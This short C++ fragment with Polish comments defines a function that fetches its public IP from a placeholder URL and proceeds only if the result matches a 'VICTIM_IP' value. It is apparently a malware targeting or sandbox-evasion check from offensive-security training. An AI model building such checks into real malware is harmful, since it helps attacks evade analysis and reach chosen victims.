// Visual Studio
// Do linkera trzeba dodac biblioteke ("Netapi32.lib")
// Properties -> Linker -> Input  (I dopisac w rubryce Additional Dependencies





#include <iostream>
#include <Windows.h>
#include <lmaccess.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;


BOOL checkIP() {
    // Declare the Website URL that we would like to vicit
    const char* websiteURL = "<nasze ip>";
    // Create an Internet Stream to access the website
    IStream* stream;
    // Create a string variable where we will store the string data received from the website
    string s;
    // Create a space in memory where we will store our IP Address
    char buff[35];
    unsigned long bytesRead;
    // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    // While data is being sent from the webserver, write it to memory
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

